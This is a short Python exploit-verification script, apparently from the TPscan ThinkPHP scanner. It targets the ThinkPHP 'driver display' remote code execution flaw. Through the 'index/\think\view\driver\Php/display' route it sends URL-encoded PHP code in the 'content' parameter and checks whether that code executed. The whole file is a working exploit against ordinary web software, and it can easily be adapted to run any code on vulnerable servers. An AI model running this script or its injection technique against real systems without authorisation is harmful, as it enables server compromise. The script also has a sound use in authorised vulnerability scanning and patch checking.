#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3

urllib3.disable_warnings()
from termcolor import colored


def thinkphp_driver_display_rce_verify(url):
    """thinkphp_driver_display_rce_verify"""
    pocdict = {
        "vulnname": "thinkphp_driver_display_rce",
        "isvul": False,
        "vulnurl": "",
        "payload": "",
        "proof": "",
        "response": "",
        "exception": "",
    }
    headers = {
        "User-Agent": 'TPscan',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760a'
            pocdict['response'] = req.status_code
            print(colored("[+] 目标存在 thinkphp_driver_display_rce 漏洞\tpayload: ", "green"))
            print(colored(pocdict, 'green'))
        else:
            print(colored("\n[*] 目标不存在 thinkphp_driver_display_rce 漏洞", "red"))
    except:
        print(colored("\n[*] 目标不存在 thinkphp_driver_display_rce 漏洞", "red"))
        pass
